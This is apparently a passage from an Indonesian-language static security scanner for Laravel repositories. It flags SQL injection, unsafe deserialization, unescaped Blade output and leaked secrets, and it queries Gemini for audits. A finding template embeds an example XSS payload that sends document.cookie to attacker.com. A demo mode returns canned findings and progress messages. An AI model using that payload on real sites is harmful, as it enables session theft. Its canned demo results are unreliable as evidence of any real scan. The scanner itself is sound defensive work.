                                "blast_radius": "Eskalasi hak akses menjadi administrator atau penimpaan kolom sensitif. Unauthorized privilege escalation and integrity violation of sensitive records.",
                                "remediation_steps": [
                                    "Gunakan $request->validated() atau $request->only([...]) alih-alih $request->all().",
                                    "Pastikan properti $fillable di model Eloquent dikonfigurasi secara ketat dan hindari $guarded = [].",
                                    "Filter input with $request->validated() and configure strict $fillable attributes on Eloquent models."
                                ],
                                "code_patch": {
                                    "language": "php",
                                    "original_code": "$model->update($request->all());",
                                    "patched_code": "$model->update($request->only(['title', 'description', 'status']));"
                                }
                            }
                        })
                        finding_id += 1

            for line_idx, line in enumerate(lines, start=1):
                line_str = line.strip()
                if not line_str or line_str.startswith("//") or line_str.startswith("#"):
                    continue
                if REGEX_RAW_SQL.search(line):
                    findings.append({
                        "id": f"logic-sql-{finding_id}",
                        "rule_id": "SYSTEM-LOGIC-RAW-SQL",
                        "category": "SYSTEM_LOGIC",
                        "severity": "HIGH",
                        "title": f"Potensi SQL Injection pada Query Mentah ({rel_path}:{line_idx})",
                        "cwe_id": "CWE-89",
                        "owasp_category": "A03:2021-Injection",
                        "cvss_score": 8.5,
                        "location": {
                            "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                            "path": rel_path,
                            "line_start": line_idx,
                            "line_end": line_idx
                        },
                        "redacted_code_snippet": line_str[:100],
                        "evidence_metadata": {
                            "risk": "Penggabungan ekspresi mentah DB::raw / whereRaw dengan variabel dinamis.",
                            "rule_type": "RAW_SQL_INJECTION"
                        },
                        "ai_remediation": {
                            "model": "rule-based-sast",
                            "warning": None,
                            "risk_explanation": "Klausul DB::raw atau whereRaw yang menggabungkan variabel pengguna tanpa parameter bindings membuka celah SQL Injection. Unparameterized raw SQL expressions break database abstraction boundaries.",
                            "attack_scenario": "Penyerang memanipulasi input query string untuk mengeksekusi perintah SQL arbitrary. Arbitrary SQL commands allow exfiltration of authentication hashes and user data.",
                            "blast_radius": "Pencurian atau manipulasi isi basis data aplikasi. Database records exfiltration and potential data integrity compromise.",
                            "remediation_steps": [
                                "Gunakan array bindings pada DB::raw('... where col = ?', [$val]).",
                                "Gunakan query builder bawaan Eloquent alih-alih ekspresi mentah.",
                                "Bind dynamic query values via array placeholders in raw database expressions."
                            ],
                            "code_patch": {
                                "language": "php",
                                "original_code": line_str,
                                "patched_code": "DB::table('users')->whereRaw('status = ? AND role = ?', [$status, $role]);"
                            }
                        }
                    })
                    finding_id += 1
                elif REGEX_INSECURE_DESERIALIZE.search(line):
                    findings.append({
                        "id": f"logic-phpdeserial-{finding_id}",
                        "rule_id": "SAST-PHP-INSECURE-DESERIALIZATION",
                        "category": "SYSTEM_LOGIC",
                        "severity": "CRITICAL",
                        "title": f"Insecure Deserialization: Pemanggilan unserialize() Dinamis ({rel_path}:{line_idx})",
                        "cwe_id": "CWE-502",
                        "owasp_category": "A08:2021-Software and Data Integrity Failures",
                        "cvss_score": 9.8,
                        "location": {
                            "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                            "path": rel_path,
                            "line_start": line_idx,
                            "line_end": line_idx
                        },
                        "redacted_code_snippet": line_str[:120],
                        "evidence_metadata": {
                            "vulnerable_code": line_str,
                            "rule_type": "PHP_DESERIALIZATION"
                        },
                        "ai_remediation": {
                            "model": "rule-based-sast",
                            "warning": None,
                            "risk_explanation": "Fungsi unserialize() pada input pengguna dapat memicu Property Oriented Programming (POP Chain) untuk mengeksekusi kode sewenang-wenang. Deserializing untrusted strings allows magic method exploitation and remote code execution.",
                            "attack_scenario": "Penyerang merakit POP chain memanfaatkan class yang ada di composer vendor. Pop chains trigger gadget destruction methods that execute shellcode.",
                            "blast_radius": "Remote Code Execution (RCE) pada server aplikasi PHP. Complete PHP server process compromise.",
                            "remediation_steps": [
                                "Gunakan json_decode($str, true) untuk parsing data serial.",
                                "Jika unserialize mutlak diperlukan, berikan opsi allowed_classes => false.",
                                "Replace unsafe object deserialization with standard json_decode or restrict allowed_classes."
                            ],
                            "code_patch": {
                                "language": "php",
                                "original_code": line_str,
                                "patched_code": "$data = json_decode($untrusted_input, true);"
                            }
                        }
                    })
                    finding_id += 1

    # Deteksi XSS pada Template Blade ({!! $var !!})
    blade_xss_seen = set()
    blade_files = [f for f in logic_files if f[0].lower().endswith(".blade.php")]
    # Prioritaskan template utama (home, services, admin, contact)
    def blade_priority(item):
        path = item[0].lower()
        if "home.blade" in path:
            return 1
        if "services.blade" in path or "pricing.blade" in path:
            return 2
        if "admin/" in path:
            return 3
        return 4

    blade_files.sort(key=blade_priority)

    for rel_path, content in blade_files:
        if len(blade_xss_seen) >= 8:
            break
        lines = content.splitlines()
        for l_idx, line in enumerate(lines, start=1):
            m = REGEX_BLADE_UNESCAPED.search(line)
            if m:
                var_expr = m.group(1).strip()
                # Filter ekspresi dinamis (bukan konstanta teks murni)
                if any(var_expr.startswith(pref) for pref in ["$", "getContent", "request(", "session(", "old("]):
                    key = f"{rel_path}:{var_expr}"
                    if key not in blade_xss_seen:
                        blade_xss_seen.add(key)
                        findings.append({
                            "id": f"logic-xss-{finding_id}",
                            "rule_id": "SAST-BLADE-UNESCAPED-XSS",
                            "category": "DOM_XSS",
                            "severity": "HIGH",
                            "title": f"Potensi Cross-Site Scripting (XSS) via Unescaped Blade Echo ({rel_path}:{l_idx})",
                            "cwe_id": "CWE-79",
                            "owasp_category": "A03:2021-Injection",
                            "cvss_score": 8.2,
                            "location": {
                                "source_origin": "WHITEBOX_BLADE_TEMPLATE",
                                "path": rel_path,
                                "line_start": l_idx,
                                "line_end": l_idx
                            },
                            "redacted_code_snippet": line.strip()[:140],
                            "evidence_metadata": {
                                "vulnerable_pattern": "{!! ... !!}",
                                "expression": var_expr,
                                "risk": "Variabel dirender langsung ke browser tanpa escaping HTML (htmlspecialchars / e()), membuka celah Stored / Reflected XSS jika data berasal dari database atau user input.",
                                "attack_scenario": f"Penyerang menyisipkan payload script berbahaya (misal: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script> atau <img src=x onerror=alert(1)>) ke dalam database konten atau parameter request. Saat view {rel_path} dimuat, browser korban mengeksekusi script secara otomatis.",
                                "blast_radius": "Pencurian session cookie administrator/pengguna, account takeover, defacement website publik, dan pengalihan pengunjung ke situs berbahaya.",
                                "rule_type": "BLADE_RAW_ECHO"
                            },
                            "ai_remediation": {
                                "model": "rule-based-sast",
                                "warning": None,
                                "risk_explanation": f"Penggunaan sintaks Blade raw echo '{{!! {var_expr} !!}}' menonaktifkan fitur escaping bawaan Laravel, sehingga browser merender string apa adanya sebagai markup HTML dan JavaScript aktif.",
                                "attack_scenario": f"Penyerang memanipulasi nilai dari '{var_expr}' melalui CMS editor, endpoint API, atau form input tanpa sanitasi. Setiap pengunjung yang memuat halaman ini akan mengeksekusi payload dalam konteks sesi browser mereka.",
                                "blast_radius": "Eksekusi JavaScript di browser klien, pencurian kredensial/token sesi, dan potensi eksploitasi admin saat meninjau konten.",
                                "remediation_steps": [
                                    f"Ganti sintaks raw echo '{{!! {var_expr} !!}}' dengan safe escaping syntax Laravel '{{{{ {var_expr} }}}}'.",
                                    "Jika format HTML (rich-text) memang dibutuhkan, sanitasi konten menggunakan pustaka pembersih HTML tepercaya seperti mews/purifier (HTMLPurifier) sebelum disimpan atau dirender.",
                                    "Terapkan Content Security Policy (CSP) pada HTTP response header untuk membatasi eksekusi inline script tak dikenal."
                                ],
                                "code_patch": {
                                    "language": "php",
                                    "original_code": line.strip(),
                                    "patched_code": line.strip().replace("{!!", "{{").replace("!!}", "}}")
                                }
                            }
                        })
                        finding_id += 1
                        if len(blade_xss_seen) >= 8:
                            break

    return findings

def scan_sast_and_secrets(
    repo_dir: str,
    entropy_threshold: float = 4.2,
    scan_depth: str = "Deep"
) -> List[Dict[str, Any]]:
    logic_files = collect_system_logic_files(repo_dir)
    findings = scan_system_logic_heuristics(repo_dir, logic_files)

    # Shannon Entropy Secrets Scan di seluruh logic/source files
    for rel_path, content in logic_files:
        sec_findings = scan_text_content(content, rel_path, entropy_threshold=entropy_threshold)
        findings.extend(sec_findings)

    # Blade Template XSS scanning
    for root, dirs, files in os.walk(repo_dir):
        dirs[:] = [d for d in dirs if d not in IGNORED_DIRS and not d.startswith(".")]
        if any(d in root.lower() for d in ["tests", "test", "node_modules", "vendor"]):
            continue
        for file in files:
            if file.lower().endswith(".blade.php"):
                full_path = os.path.join(root, file)
                rel_path = os.path.relpath(full_path, repo_dir).replace("\\", "/")
                try:
                    with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                        for l_idx, line in enumerate(f, start=1):
                            if REGEX_BLADE_UNESCAPED.search(line):
                                findings.append({
                                    "id": f"blade-xss-{len(findings)+1}",
                                    "rule_id": "SAST-BLADE-UNESCAPED-XSS",
                                    "category": "DOM_XSS",
                                    "severity": "HIGH",
                                    "title": f"Potensi XSS melalui Unescaped Output Blade {line.strip()[:40]}",
                                    "cwe_id": "CWE-79",
                                    "owasp_category": "A03:2021-Injection",
                                    "cvss_score": 7.5,
                                    "location": {
                                        "source_origin": "WHITEBOX_BLADE_TEMPLATE",
                                        "path": rel_path,
                                        "line_start": l_idx,
                                        "line_end": l_idx
                                    },
                                    "redacted_code_snippet": line.strip()[:100],
                                    "evidence_metadata": {
                                        "syntax": "{!! $var !!}",
                                        "rule_type": "BLADE_RAW_ECHO"
                                    }
                                })
                                break
                except Exception:
                    pass

    return findings

def scan_text_content(content: str, file_path: str, entropy_threshold: float = 4.2) -> List[Dict[str, Any]]:
    findings: List[Dict[str, Any]] = []
    lines = content.splitlines()

    for line_idx, line in enumerate(lines, start=1):
        # 1. Kunci OpenAI
        for match in REGEX_GENERIC_KEY.finditer(line):
            token = match.group(1)
            entropy = calculate_shannon_entropy(token)
            if entropy >= entropy_threshold:
                redacted_snippet = redact_secret(line.strip())
                findings.append({
                    "id": f"sec-openai-{line_idx}-{abs(hash(token)) % 1000}",
                    "rule_id": "JS-SECRET-OPENAI",
                    "category": "JS_SECRET_LEAK",
                    "severity": "CRITICAL",
                    "title": f"Kunci API OpenAI Terekspos di Source Code ({os.path.basename(file_path)})",
                    "cwe_id": "CWE-798",
                    "owasp_category": "A07:2021-Identification and Authentication Failures",
                    "cvss_score": 8.9,
                    "location": {
                        "source_origin": "WHITEBOX_SOURCE_CODE",
                        "path": file_path,
                        "line_start": line_idx,
                        "line_end": line_idx
                    },
                    "redacted_code_snippet": redacted_snippet,
                    "evidence_metadata": {
                        "prefix_matched": "sk-",
                        "shannon_entropy": round(entropy, 2),
                        "threshold": entropy_threshold,
                        "token_preview": "«redacted:sk-…»"
                    }
                })

        # 2. General High Entropy Secret Token
        for match in REGEX_SECRET_TOKEN.finditer(line):
            token = match.group(1)
            entropy = calculate_shannon_entropy(token)
            if entropy >= entropy_threshold:
                redacted_snippet = redact_secret(line.strip())
                findings.append({
                    "id": f"sec-token-{line_idx}-{abs(hash(token)) % 1000}",
                    "rule_id": "WHITEBOX-HIGH-ENTROPY-SECRET",
                    "category": "JS_SECRET_LEAK",
                    "severity": "HIGH",
                    "title": f"Deteksi High-Entropy Secret (H={entropy:.2f} >= {entropy_threshold}) di {os.path.basename(file_path)}",
                    "cwe_id": "CWE-798",
                    "owasp_category": "A07:2021-Identification and Authentication Failures",
                    "cvss_score": 7.8,
                    "location": {
                        "source_origin": "WHITEBOX_SOURCE_CODE",
                        "path": file_path,
                        "line_start": line_idx,
                        "line_end": line_idx
                    },
                    "redacted_code_snippet": redacted_snippet,
                    "evidence_metadata": {
                        "shannon_entropy": round(entropy, 2),
                        "threshold": entropy_threshold,
                        "token_preview": redact_secret(token)
                    }
                })

    return findings

async def analyze_system_logic_with_ai(
    repo_dir: str,
    logic_files: List[Tuple[str, str]],
    scan_depth: str = "Deep"
) -> Tuple[List[Dict[str, Any]], Optional[str]]:
    if not settings.GEMINI_API_KEY:
        logger.info("GEMINI_API_KEY tidak dikonfigurasi. Menggunakan heuristic logic engine dengan fallback warning.")
        findings = scan_system_logic_heuristics(repo_dir, logic_files)
        return findings, AI_FALLBACK_WARNING

    try:
        def get_file_priority(path: str) -> int:
            p = path.lower()
            # 1. Routing & API Entrypoints
            if any(k in p for k in ["route", "router", "routes/", "web.php", "api.php", "urls.py", "app.py", "main.py", "server.js", "index.js", "main.go", "gin", "mux", "controller", "handler", "api/", "endpoints/"]):
                return 1
            # 2. Security, Auth & Middleware
            if any(k in p for k in ["middleware", "auth", "jwt", "policy", "guard", "security", "perm", "rbac", "session", "token"]):
                return 2
            # 3. Database, ORM & Queries
            if any(k in p for k in ["model", "schema", "entity", "query", "repo", "repository", "migration", "database", "db."]):
                return 3
            # 4. Service & Business Logic
            if any(k in p for k in ["service", "usecase", "helper", "utils", "upload", "payment", "export"]):
                return 4
            # 5. Templates & Frontend Views
            if ".blade.php" in p or any(k in p for k in ["pages/", "views/", "components/", "templates/", ".vue", ".svelte"]):
                return 5
            # 6. Configuration & Deployment
            if any(k in p for k in ["dockerfile", "docker-compose", "nginx", ".env", "settings", "config"]):
                return 6
            return 7

        detected_stack = detect_tech_stack_from_dir(repo_dir)
        stack_str = ", ".join(detected_stack) if detected_stack else "General Web / API Application"

        sorted_files = sorted(logic_files, key=lambda x: get_file_priority(x[0]))
        prompt_files = []
        total_len = 0

        # Batas token/karakter disesuaikan dengan scan_depth
        if scan_depth == "Shallow":
            max_total_chars = 90_000
            max_file_snippet = 15_000
        elif scan_depth == "Medium":
            max_total_chars = 170_000
            max_file_snippet = 25_000
        else:  # Deep
            max_total_chars = 260_000
            max_file_snippet = 40_000

        for rel_path, content in sorted_files:
            if total_len > max_total_chars:
                break
            snippet = content[:max_file_snippet]
            prompt_files.append(f"--- FILE: {rel_path} ---\n{snippet}")
            total_len += len(snippet)

        joined_code = "\n\n".join(prompt_files)

        prompt = (
            "Kamu adalah Principal Staff Security Researcher & Lead Red Team Assessor.\n"
            "Lakukan audit Whitebox SAST MENDALAM pada source code berikut dengan metodologi Source-to-Sink Taint Tracking, Inter-Procedural Control Flow Analysis, dan Business Logic Flaw Analysis.\n\n"
            f"TEKNOLOGI & STACK TERDETEKSI: {stack_str}\n\n"
            "METODOLOGI AUDIT MENDALAM (WAJIB DILAKUKAN):\n"
            "1. TAINT ANALYSIS (SOURCE-TO-SINK TRACKING):\n"
            "   - Telusuri seluruh input pengguna yang tidak dipercaya (Untrusted Sources): parameter query, payload request body JSON/form-data, URL route parameters, HTTP header (User-Agent, Authorization, Referer, X-Forwarded-*), cookies, file upload stream/metadata, WebSocket message, dan webhook callback.\n"
            "   - Identifikasi apakah data input mencapai Dangerous Sinks tanpa validasi/sanitasi yang memadai:\n"
            "     * SQL Injection (CWE-89): DB::raw(), whereRaw(), query format string (%s, .format(), f-strings), raw concatenations pada SQLAlchemy/GORM/Prisma/pg/mysql.\n"
            "     * Remote Command Injection (CWE-78): subprocess, os.system, exec, child_process.exec, exec.Command, popen dengan argumen dinamis.\n"
            "     * Cross-Site Scripting (XSS - CWE-79): unescaped template echo ({!! $v !!}, dangerouslySetInnerHTML, v-html, html/template tanpa escaping).\n"
            "     * Path Traversal / Arbitrary File Read/Write (CWE-22, CWE-23): os.path.join, path.join, open() dengan input nama berkas dari pengguna.\n"
            "     * Server-Side Request Forgery (SSRF - CWE-918): httpx, requests, fetch, axios, http.Get dengan target URL dinamis tanpa validasi skema dan IP loopback/RFC1918.\n"
            "     * Insecure Deserialization (CWE-502): pickle.loads, yaml.load tanpa SafeLoader, unserialize() PHP, ObjectInputStream Java.\n"
            "2. INTER-PROCEDURAL & ARCHITECTURAL AUTHORIZATION ANALYSIS:\n"
            "   - Periksa integrasi antara Route -> Middleware -> Controller -> Service -> Model.\n"
            "   - Verifikasi apakah route dilindungi middleware otentikasi/otorisasi yang tepat. Waspadai route yang tidak terpasang guard atau lupa diberi filter tenant/organisasi.\n"
            "   - Analisis BOLA/IDOR (CWE-639) dan Broken Object Level Authorization: apakah pengguna dapat memanipulasi entitas milik pengguna/tenant lain melalui ID tanpa pemeriksaan kepemilikan ($this->authorize / scoping query berdasarkan auth_user_id).\n"
            "   - Broken Function Level Authorization (CWE-862): endpoint administratif atau mutasi kritis yang dapat diakses oleh peran non-admin atau pengguna anonim.\n"
            "3. BUSINESS LOGIC & CONCURRENCY FLAWS:\n"
            "   - Mass Assignment / Insecure Parameter Binding (CWE-915): penggunaan $request->all(), req.body, atau model(**kwargs) langsung ke persistence update/create tanpa whitelist atribut ketat.\n"
            "   - Insecure File Upload (CWE-434): pemeriksaan MIME-type client-side tanpa whitelist ekstensi ganda, magic bytes, atau isolasi direktori penyimpanan publik.\n"
            "   - Race Conditions & TOCTOU (CWE-367): mutasi saldo, inventaris, voucher, atau state tanpa atomic transaction / row locking.\n"
            "4. INFRASTRUCTURE & REPO CONFIGURATION:\n"
            "   - Berkas sensitif committed (.env, database biner .sqlite/.db, private keys).\n"
            "   - Docker & Container misconfigurations: container running as root (CWE-250), privileged mode aktif, insecure mount host socket.\n\n"
            "STANDAR BAHASA & FORMAT OUTPUT:\n"
            "- Gunakan bahasa Indonesia untuk penjelasan teknis yang mendalam, presisi, dan actionable.\n"
            "- ATURAN KHUSUS KALIMAT TERAKHIR: Pada setiap narasi ('explanation', 'attack_scenario', dan 'blast_radius'), KALIMAT TERAKHIR WAJIB ditulis dalam bahasa Inggris profesional sebagai security impact / key takeaway.\n"
            "- Pada 'remediation_steps', langkah mitigasi terakhir WAJIB ditulis dalam bahasa Inggris.\n\n"
            f"BERKAS KODE SISTEM PRIORITAS:\n{joined_code}\n\n"
            "Output HARUS berupa format JSON valid tanpa markdown formatting dengan skema persis:\n"
            "{\n"
            '  "findings": [\n'
            "    {\n"
            '      "rule_id": "TAINT-SQLI-UNBOUND-PARAMETER",\n'
            '      "category": "SYSTEM_LOGIC",\n'
            '      "severity": "CRITICAL",\n'
            '      "title": "Judul temuan spesifik dan mendalam",\n'
            '      "cwe_id": "CWE-89",\n'
            '      "owasp_category": "A03:2021-Injection",\n'
            '      "cvss_score": 9.1,\n'
            '      "file_path": "path/ke/file",\n'
            '      "line_number": 10,\n'
            '      "code_snippet": "cuplikan kode asli yang bermasalah",\n'
            '      "explanation": "Penjelasan analisis taint flow atau celah otorisasi dalam bahasa Indonesia. Ensure all untrusted inputs are strictly parameterized and guarded by authorization policies.",\n'
            '      "attack_scenario": "Skenario eksploitasi langkah-demi-langkah dalam bahasa Indonesia. Attackers can leverage this unvalidated data flow to compromise application state.",\n'
            '      "blast_radius": "Dampak nyata kompromi dalam bahasa Indonesia. Full database exposure and severe data confidentiality loss may result.",\n'
            '      "exploit_chain": "Potensi perangkaian eksploitasi dengan celah lain",\n'
            '      "prerequisites": "Syarat yang dibutuhkan penyerang",\n'
            '      "remediation_steps": ["Langkah mitigasi 1", "Langkah mitigasi 2", "Enforce strict parameterized queries and immutable model attribute bindings."],\n'
            '      "patched_code": "Kode aman hasil refactor / perbaikan siap pakai"\n'
            "    }\n"
            "  ]\n"
            "}"
        )

        candidate_models = []
        for m in [settings.GEMINI_MODEL, "gemini-flash-lite-latest", "gemini-3.5-flash-lite", "gemini-3.5-flash", "gemini-3.8-flash"]:
            if m and m not in candidate_models:
                candidate_models.append(m)

        for model_name in candidate_models:
            url = f"https://generativelanguage.googleapis.com/v1beta/models/{model_name}:generateContent?key={settings.GEMINI_API_KEY}"
            payload = {
                "contents": [{"parts": [{"text": prompt}]}],
                "generationConfig": {"temperature": 0.2, "responseMimeType": "application/json"}
            }

            model_timeout = 25.0 if "argon" in model_name else (20.0 if "3.8" in model_name else 15.0)
            for attempt in range(2):
                try:
                    async with httpx.AsyncClient(timeout=model_timeout) as client:
                        resp = await client.post(url, json=payload)
                        if resp.status_code == 200:
                            data = resp.json()
                            candidate_text = data["candidates"][0]["content"]["parts"][0]["text"]
                            try:
                                parsed = robust_json_parse(candidate_text)
                            except Exception as e_json:
                                logger.warning(f"robust_json_parse gagal pada {model_name}: {e_json}")
                                parsed = None

                            if not parsed or not isinstance(parsed, dict):
                                continue

                            raw_findings = parsed.get("findings", [])
                            if not raw_findings and isinstance(parsed, list):
                                raw_findings = parsed

                            ai_findings = []
                            for idx, rf in enumerate(raw_findings, 1):
                                file_p = rf.get("file_path", "app.py")
                                code_snip = rf.get("code_snippet", "")
                                patched_snip = rf.get("patched_code", "// Patched safe implementation")
                                lang = detect_code_language(file_p, snippet=code_snip or patched_snip)

                                t_lower = rf.get("title", "").lower()
                                rule_lower = rf.get("rule_id", "").lower()
                                cat_lower = rf.get("category", "").lower()

                                if "xss" in t_lower or "xss" in rule_lower or cat_lower == "dom_xss":
                                    default_cwe, default_owasp, default_cat = "CWE-79", "A03:2021-Injection", "DOM_XSS"
                                elif "sql" in t_lower or "sql" in rule_lower:
                                    default_cwe, default_owasp, default_cat = "CWE-89", "A03:2021-Injection", "SYSTEM_LOGIC"
                                elif "cmd" in t_lower or "command" in t_lower or "exec" in t_lower:
                                    default_cwe, default_owasp, default_cat = "CWE-78", "A03:2021-Injection", "SYSTEM_LOGIC"
                                elif "ssrf" in t_lower or "ssrf" in rule_lower:
                                    default_cwe, default_owasp, default_cat = "CWE-918", "A10:2021-Server-Side Request Forgery (SSRF)", "SYSTEM_LOGIC"
                                elif "deserial" in t_lower or "deserial" in rule_lower:
                                    default_cwe, default_owasp, default_cat = "CWE-502", "A08:2021-Software and Data Integrity Failures", "SYSTEM_LOGIC"
                                elif "bola" in t_lower or "idor" in t_lower or "access control" in t_lower:
                                    default_cwe, default_owasp, default_cat = "CWE-639", "A01:2021-Broken Access Control", "SYSTEM_LOGIC"
                                elif "upload" in t_lower or "file" in t_lower:
                                    default_cwe, default_owasp, default_cat = "CWE-434", "A04:2021-Insecure Design", "SYSTEM_LOGIC"
                                elif "mass assignment" in t_lower:
                                    default_cwe, default_owasp, default_cat = "CWE-915", "A04:2021-Insecure Design", "SYSTEM_LOGIC"
                                elif "docker" in t_lower or "container" in t_lower or "misconfig" in t_lower or "env" in t_lower:
                                    default_cwe, default_owasp, default_cat = "CWE-250", "A05:2021-Security Misconfiguration", "SYSTEM_LOGIC"
                                else:
                                    default_cwe, default_owasp, default_cat = "CWE-285", "A01:2021-Broken Access Control", "SYSTEM_LOGIC"

                                ai_findings.append({
                                    "id": f"ai-logic-{idx}",
                                    "rule_id": rf.get("rule_id", "OWASP-TOP10-LOGIC-FLAW"),
                                    "category": rf.get("category", default_cat),
                                    "severity": rf.get("severity", "HIGH"),
                                    "title": rf.get("title", "Celah Logika Sistem"),
                                    "cwe_id": rf.get("cwe_id", default_cwe),
                                    "owasp_category": rf.get("owasp_category", default_owasp),
                                    "cvss_score": float(rf.get("cvss_score", 7.5)),
                                    "location": {
                                        "source_origin": "WHITEBOX_AI_SYSTEM_LOGIC",
                                        "path": file_p,
                                        "line_start": int(rf.get("line_number", 1)),
                                        "line_end": int(rf.get("line_number", 1))
                                    },
                                    "redacted_code_snippet": code_snip,
                                    "evidence_metadata": {
                                        "ai_audited": True,
                                        "model": model_name,
                                        "explanation": rf.get("explanation", ""),
                                        "attack_scenario": rf.get("attack_scenario", ""),
                                        "blast_radius": rf.get("blast_radius", ""),
                                        "exploit_chain": rf.get("exploit_chain", ""),
                                        "prerequisites": rf.get("prerequisites", "")
                                    },
                                    "ai_remediation": {
                                        "model": model_name,
                                        "warning": None,
                                        "risk_explanation": rf.get("explanation", ""),
                                        "attack_scenario": rf.get("attack_scenario", ""),
                                        "blast_radius": rf.get("blast_radius", ""),
                                        "exploit_chain": rf.get("exploit_chain", ""),
                                        "remediation_steps": rf.get("remediation_steps", [
                                            "Terapkan validasi input dan otorisasi ketat.",
                                            "Batasi akses endpoint hanya untuk entitas terverifikasi.",
                                            "Enforce strict authentication and authorization validation on all mutating sinks."
                                        ]),
                                        "code_patch": {
                                            "language": lang,
                                            "original_code": code_snip,
                                            "patched_code": patched_snip
                                        }
                                    }
                                })

                            if ai_findings:
                                heuristic_findings = scan_system_logic_heuristics(repo_dir, logic_files)
                                merged = list(ai_findings)
                                seen_locs = {
                                    (f.get("location", {}).get("path"), f.get("location", {}).get("line_start"), f.get("cwe_id"))
                                    for f in ai_findings
                                }
                                for h in heuristic_findings:
                                    h_loc = (h.get("location", {}).get("path"), h.get("location", {}).get("line_start"), h.get("cwe_id"))
                                    h_rule_path = (h.get("location", {}).get("path"), h.get("rule_id"))
                                    if h_loc not in seen_locs and not any((f.get("location", {}).get("path"), f.get("rule_id")) == h_rule_path for f in ai_findings):
                                        seen_locs.add(h_loc)
                                        merged.append(h)
                                return merged, None
                        elif resp.status_code in (429, 503):
                            logger.warning(f"Gemini API model {model_name} status {resp.status_code} (high demand), mencoba model kandidat berikutnya...")
                            break
                        else:
                            logger.warning(f"Gemini API model {model_name} status {resp.status_code}")
                            break
                except Exception as e_model:
                    err_desc = f"{type(e_model).__name__}: {e_model or 'Request Timeout'}"
                    logger.warning(f"Gemini model {model_name} error: {err_desc}")
                    break
    except Exception as e:
        logger.warning(f"AI Whitebox analysis error ({e}), beralih ke heuristic engine.")

    findings = scan_system_logic_heuristics(repo_dir, logic_files)
    return findings, AI_FALLBACK_WARNING

async def scan_whitebox(
    repo_url: str,
    branch: str = "main",
    entropy_threshold: float = 4.2,
    scan_depth: str = "Deep",
    progress_callback: Optional[Any] = None
) -> Tuple[List[Dict[str, Any]], List[str], Optional[str]]:
    findings: List[Dict[str, Any]] = []
    tech_stack: List[str] = []
    ai_status_warning: Optional[str] = None

    clean_url = (repo_url or "").strip()

    if not clean_url or "demo" in clean_url.lower() or "fintech" in clean_url.lower() or "umkm" in clean_url.lower():
        ai_status_warning = AI_FALLBACK_WARNING if not settings.GEMINI_API_KEY else None
        
        if progress_callback:
            await progress_callback("WB_INIT", 20, "Kloning repositori Git selesai. Terdeteksi stack Laravel & React...")
            await asyncio.sleep(0.4)
            await progress_callback("WB_SCA_CVE", 38, "SCA selesai: 1 dependensi berisiko CVE-2021-23337 (lodash) terdeteksi...")
            await asyncio.sleep(0.4)
            await progress_callback("WB_AST_XSS", 55, "Pemeriksaan AST & sintaks Blade template selesai: 0 celah XSS template...")
            await asyncio.sleep(0.4)
            await progress_callback("WB_SECRETS", 72, f"Penambangan rahasia selesai: Shannon Entropy H(X)>={entropy_threshold} & deteksi kredensial...")
            await asyncio.sleep(0.4)
            await progress_callback("WB_TAINT_LOGIC", 86, "Pelacakan alur taint & kontrol otorisasi selesai: 3 celah logic terdeteksi...")

        demo_findings = [
            {
                "id": "logic-demo-1",
                "rule_id": "SYSTEM-LOGIC-BOLA-IDOR",
                "category": "SYSTEM_LOGIC",
                "severity": "HIGH",
                "title": "Potensi BOLA/IDOR: Penghapusan Objek Tanpa Otorisasi (MediaController::destroy)",
                "cwe_id": "CWE-639",
                "owasp_category": "A01:2021-Broken Access Control",
                "cvss_score": 7.5,
                "location": {
                    "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                    "path": "app/Http/Controllers/MediaController.php",
                    "line_start": 95,
                    "line_end": 105
                },
                "redacted_code_snippet": "$media = Media::findOrFail($id);\n$media->delete();",
                "evidence_metadata": {
                    "method": "destroy($id)",
                    "missing_check": "$this->authorize('delete', $media) atau validasi kepemilikan Auth::user()",
                    "ai_status": ai_status_warning
                }
            },
            {
                "id": "logic-demo-2",
                "rule_id": "SYSTEM-LOGIC-INSECURE-UPLOAD",
                "category": "SYSTEM_LOGIC",
                "severity": "HIGH",
                "title": "Logika Upload File Rentan: Validasi MIME-Type Tanpa Whitelist Ekstensi (ContentController::uploadFile)",
                "cwe_id": "CWE-434",
                "owasp_category": "A04:2021-Insecure Design",
                "cvss_score": 7.8,
                "location": {
                    "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                    "path": "app/Http/Controllers/Admin/ContentController.php",
                    "line_start": 102,
                    "line_end": 115
                },
                "redacted_code_snippet": "'file' => 'required|file|max:10240', // Missing mimes: rule",
                "evidence_metadata": {
                    "method": "uploadFile(Request $request)",
                    "vulnerable_rule": "Validasi file tidak menggunakan whitelist ekstensi mimes:, berpotensi membuka celah file upload bypass.",
                    "ai_status": ai_status_warning
                }
            },
            {
                "id": "logic-demo-3",
                "rule_id": "SYSTEM-LOGIC-MASS-ASSIGNMENT",
                "category": "SYSTEM_LOGIC",
                "severity": "MEDIUM",
                "title": "Potensi Mass Assignment: Meneruskan Input Mentah ($request->all()) ke Model (ContentController::updateContent)",
                "cwe_id": "CWE-915",
                "owasp_category": "A04:2021-Insecure Design",
                "cvss_score": 6.5,
                "location": {
                    "source_origin": "WHITEBOX_SYSTEM_LOGIC",
                    "path": "app/Http/Controllers/Admin/ContentController.php",
                    "line_start": 20,
                    "line_end": 35
                },
                "redacted_code_snippet": "$section = Section::firstOrCreate(['key' => $request->section_key], $request->all());",
                "evidence_metadata": {
                    "method": "updateContent(Request $request)",
                    "flaw": "$request->all() diteruskan ke fungsi firstOrCreate tanpa filtrasi atribut ketat.",
                    "ai_status": ai_status_warning
                }
            },
            {
                "id": "cve-demo-lodash",
                "rule_id": "CVE-2021-23337",
                "category": "CVE_DEPENDENCY",
                "severity": "MEDIUM",
                "title": "OSV.dev CVE-2021-23337: Prototype Pollution in lodash < 4.17.21 (lodash@4.17.20)",
                "cwe_id": "CWE-1321",
                "owasp_category": "A06:2021-Vulnerable and Outdated Components",
                "cvss_score": 6.8,
                "location": {
                    "source_origin": "PACKAGE_LOCK_SCA",
                    "path": "package-lock.json (lodash@4.17.20)",
                    "line_start": 1,
                    "line_end": 1
                },
                "redacted_code_snippet": '"lodash": "4.17.20"',
                "evidence_metadata": {
                    "package": "lodash",
                    "version": "4.17.20",
                    "cve": "CVE-2021-23337",
                    "is_reachable_in_code": True,
                    "ai_status": ai_status_warning
                }
            }
        ]

